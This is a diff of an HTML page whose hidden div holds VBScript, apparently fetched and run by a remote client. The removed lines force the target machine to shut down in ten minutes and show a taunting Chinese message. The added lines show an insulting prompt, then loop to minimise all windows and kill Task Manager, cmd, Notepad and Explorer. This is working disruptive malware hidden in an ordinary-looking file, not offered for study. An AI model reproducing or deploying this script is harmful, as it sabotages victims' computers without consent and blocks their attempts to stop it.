@@ -2,10 +2,29 @@
 <head><meta charset="UTF-8"></head>
 <body>
 <div id="mode" style="display:none;">0</div>
-<div id="id" style="display:none;">2021712</div>
+<div id="id" style="display:none;">20217122</div>
 <div id="main" style="display:none;">
-On Error Resume Next
-CreateObject("wscript.shell").run "cmd.exe /c shutdown -s -f -t 600"
-msgbox "服务器正在关你的机，剩余10分钟……",4096,"温馨提示"
+inputbox "你为什么要坑我！","警告","我是傻逼"
+
+set ws=createobject("wscript.shell") 
+for fuckyou=1 to 20
+CreateObject("shell.Application").MinimizeAll
+wscript.sleep 200
+CreateObject("shell.Application").MinimizeAll
+wscript.sleep 200
+For Each a in GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")
+If a.name = "Taskmgr.exe" then
+a.Terminate()
+elseif a.name = "cmd.exe" then
+a.Terminate()
+elseif a.name = "notepad.exe" then
+a.Terminate()
+elseif a.name = "explorer.exe" then
+a.Terminate()
+End if
+next
+abcde=20-fuckyou
+ws.sendKeys abcde
+next
 </div><div id="exe" style="display:none;">服务器正在关你的机，剩余10分钟……
 </div></body></html>
